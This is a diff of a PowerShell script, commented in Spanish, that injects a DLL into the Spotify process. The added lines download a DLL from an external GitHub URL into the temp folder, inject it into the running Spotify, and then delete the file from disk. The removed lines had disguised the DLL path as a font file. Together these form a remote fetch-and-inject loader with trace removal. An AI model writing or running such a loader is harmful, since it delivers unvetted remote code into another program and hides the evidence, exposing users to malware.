@@ -1,10 +1,13 @@
-# Inyección de DLL en el proceso de Spotify.
-# El DLL permanecerá cargado en Spotify aunque cierres la consola.
-# Ejecuta CMD/PowerShell como administrador.
+# CONFIG
+$dllUrl = "https://raw.githubusercontent.com/WkgGlobalservices2024/shzzz/main/xgamecontrol.dll"
+$dllPath = "$env:TEMP\xgamecontrol.dll"
+$proc = "Spotify"
+$spotifyPath = "$env:APPDATA\Spotify\Spotify.exe"
 
-$ErrorActionPreference = "SilentlyContinue"
-$ProgressPreference = "SilentlyContinue"
+# DESCARGA EL DLL
+Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath
 
+# INYECCIÓN
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -61,12 +64,7 @@ function Inject-Dll {
     [Kernel32]::CloseHandle($hProcess) | Out-Null
 }
 
-# Configura las rutas
-$dll = "C:\Windows\Fonts\dafont.ttf"  # Cambia por la ruta real de tu DLL
-$proc = "Spotify"
-$spotifyPath = "$env:APPDATA\Spotify\Spotify.exe"
-
-# Inicia Spotify si no está abierto
+# INICIA SPOTIFY SI NO ESTÁ ABIERTO
 if (-not (Get-Process -Name $proc -ErrorAction SilentlyContinue)) {
     Start-Process -FilePath $spotifyPath
     $retry = 0
@@ -77,5 +75,8 @@ if (-not (Get-Process -Name $proc -ErrorAction SilentlyContinue)) {
     }
 }
 
-# Inyecta el DLL en Spotify
-Inject-Dll -ProcessName $proc -DllPath $dll
+# INYECTA Y BORRA EL DLL
+Inject-Dll -ProcessName $proc -DllPath $dllPath
+
+# BORRA EL DLL DEL DISCO
+Remove-Item $dllPath -Force
